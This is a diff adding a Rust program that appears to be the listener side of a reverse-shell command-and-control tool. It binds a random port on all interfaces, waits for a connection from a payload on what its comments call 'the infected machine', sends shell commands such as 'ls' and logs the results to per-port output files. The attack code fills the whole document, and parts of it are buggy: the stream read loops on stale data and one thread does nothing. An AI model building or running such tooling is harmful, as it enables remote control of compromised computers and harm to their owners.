@@ -1,0 +1,220 @@
+use std::fs::File;
+use std::time::Duration;
+use std::io::{Read, Write, self};
+use std::net::TcpListener;
+use std::thread::{spawn, JoinHandle, self};
+use std::sync::{Arc, Mutex};
+use rand::Rng;
+use std::sync::mpsc;
+
+// Let's create a structure that will reimplement the read type so that we
+// have a input_string
+struct RevShellInputStream {
+    data: String,
+}
+
+// Let's implement this structure and link the necessary functions
+impl RevShellInputStream {
+    fn new(initial_data: &str) -> Self {
+        RevShellInputStream {
+            data: initial_data.to_string(),
+        }
+    }
+
+    // Now let's create the update data method that will allow
+    // us to update the data for this specific stream overtime
+    fn update_data(&mut self, new_data: &String) {
+        self.data = new_data.to_string();
+    }
+}
+
+// Now let's reimplement the Read trait to be specific for our input stream
+impl Read for RevShellInputStream {
+    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
+        let bytes_read = self.data.as_bytes().read(buf)?;
+        Ok(bytes_read)
+    }
+}
+
+// Let's create a specific structure that will hold
+// all the necessary infos related to our specific revshell
+pub struct RevShell {
+    output_file: String, // This is the name of the file in the format shell_port.out where the
+    // output from the revshell commands will be store for the web interactions
+    port_number: u16, // The port number that will also serve as an id for the infected machine
+    input_stream: Arc<Mutex<RevShellInputStream>>, // The input stream where we will send our commands (added
+    // the liftime elision)
+    command_sender: mpsc::Sender<()>, // Will be used to notify the associated thread that a
+    // command is sent
+    command_receiver: Arc<Mutex<mpsc::Receiver<()>>>,
+}
+
+// Let's now implement the RevShell structure
+impl RevShell {
+    fn new(new_port: u16, shell: String) -> Self {
+        let (command_sender, command_receiver) = mpsc::channel();
+        let command_receiver = Arc::new(Mutex::new(command_receiver));
+        let input_stream = Arc::new(Mutex::new(RevShellInputStream::new("")));
+
+        let command_receiver_clone = Arc::clone(&command_receiver);
+        // Let's spawn a thread for handling the commands
+        spawn(move || {
+            for _ in command_receiver_clone.lock().unwrap().iter() {
+
+            }
+        });
+
+        RevShell {
+            output_file: shell,
+            port_number: new_port,
+            input_stream,
+            command_sender,
+            command_receiver,
+        }
+    }
+
+    // Let's also create a function that will be used to send command to the shell
+    fn send_command(&self, command: String) {
+        let new_input_stream = Arc::clone(&self.input_stream);
+        let mut stream = new_input_stream.lock().unwrap();
+        stream.update_data(&command);
+
+        // Send a signal to the command handling the thread
+        let _ = self.command_sender.send(());
+    }
+}
+
+// Let's create a function that will check if a specific tcp port is
+// available
+pub fn is_port_available(port: u16) -> bool {
+    // We create a TcpListener to the specific port
+    match TcpListener::bind(("127.0.0.1", port)) {
+        // If it returns ok when creating the listener it means
+        // that the port is available if not we return false
+        Ok(_) => true,
+        Err(_) => false,
+    }
+}
+
+// Now let's create a function that will return a random port from
+// a specific range
+pub fn get_available_port(min: u16, max: u16) -> u16 {
+    // Let's create the generator
+    let mut rng = rand::thread_rng();
+    // We generate a first random port
+    let mut port: u16 = rng.gen_range(min..max);
+    // If it's not a usable one we loop until we found a correct port
+    while !is_port_available(port) {
+        port = rng.gen_range(min..max);
+    }
+
+    // We then return the correct port
+    return port;
+}
+
+// This function will be used for the incoming connections from the payload
+// it is used to separate in 2 different threads the input and the output
+// so our connection in bidirectional
+fn pipe_thread<R, W>(read: Arc<Mutex<R>>, write: Arc<Mutex<W>>, command_receiver: Arc<Mutex<mpsc::Receiver<()>>>) -> JoinHandle<()>
+where
+    R: Read + Send + 'static,
+    W: Write + Send + 'static,
+{
+    spawn(move || {
+        let mut buffer = [0; 1024];
+        loop {
+            // Check for incoming commands
+            if let Ok(_) = command_receiver.lock().unwrap().try_recv() {
+                // Do something when a new command is received
+                // For example, you can read the command from the stream
+                let len = match read.lock() {
+                    Ok(mut guard) => guard.read(&mut buffer).unwrap(),
+                    Err(e) => {
+                        eprintln!("Error acquiring lock on read: {}", e);
+                        break;
+                    }
+                };
+
+                // Process the command (in this example, just print it)
+                let command = String::from_utf8_lossy(&buffer[..len]);
+                println!("Received command: {}", command);
+            }
+
+            // Continue with reading from the input stream
+            let len = match read.lock() {
+                Ok(mut guard) => guard.read(&mut buffer).unwrap(),
+                Err(e) => {
+                    eprintln!("Error acquiring lock on read: {}", e);
+                    break;
+                }
+            };
+
+            if len == 0 {
+                break;
+            }
+
+            println!("Received data: {:?}", &buffer[..len]);
+
+            let write_result = write.lock().map(|mut guard| guard.write_all(&buffer[..len]));
+            if let Err(e) = write_result {
+                eprintln!("Error acquiring lock on write: {:?}", e);
+                break;
+            }
+        }
+    })
+}
+
+
+// This is a simple function that will create a TcpListener for our incoming
+// payload connections. It takes our RevShell structure in argument so that we can create the
+// listener and link the input stream to our structure
+pub fn listen(revshell: &RevShell) {
+    // Create the listener and bind it to 0.0.0.0 and the specified port
+    let tcp_connection = TcpListener::bind(("0.0.0.0", revshell.port_number)).unwrap();
+    
+    // Let's get the stream
+    let (stream, _) = tcp_connection.accept().unwrap();
+
+    // And clone it to a Arc mutex tcp stream
+    let stream_clone = Arc::new(Mutex::new(stream));
+
+    // Now let's create the separate thread for the the input by taking the one from
+    // our structure
+    let input_stream_clone = Arc::clone(&revshell.input_stream);
+    let command_receiver = Arc::clone(&revshell.command_receiver);
+
+    let input = pipe_thread(input_stream_clone, stream_clone.clone(), command_receiver.clone()); // Clone the stream
+    
+    // Now let's create the output file and link it to the output stream
+    let output_file_name = File::create(revshell.output_file.to_owned()).unwrap();
+    let output_file = Arc::new(Mutex::new(output_file_name));
+    let output = pipe_thread(stream_clone, output_file, command_receiver.clone()); // Just used to write to stdout
+   
+    // Now we just wait for the two threads to finish
+    let _ = input.join();
+    let _ = output.join();
+}
+
+pub fn main() {
+    let random_port = get_available_port(4000, 5000);
+    println!("[INFO] - Got port: {}", random_port);
+    let shell_file: String = format!("./shell_{}.out", random_port);
+    println!("[INFO] - Shell file will be {}", shell_file);
+    let shell = Arc::new(RevShell::new(random_port, shell_file));
+    println!("[INFO] - Created RevShell structure with:");
+    println!("          port: {}", shell.port_number);
+    println!("          output_file: {}", shell.output_file);
+
+    // Clone the thread so that we can use it before moving it to resume
+    // the program execution
+    let shell_clone = Arc::clone(&shell);
+    spawn(move || {
+        listen(&shell_clone);
+    });
+    println!("[INFO] - Listening for incoming connections");
+    println!("[INFO] - Waiting for 20 seconds...");
+    thread::sleep(Duration::from_secs(20));
+    println!("[INFO] - Sending command");
+    shell.send_command("ls".to_owned());
+    thread::sleep(Duration::from_secs(1));
+}
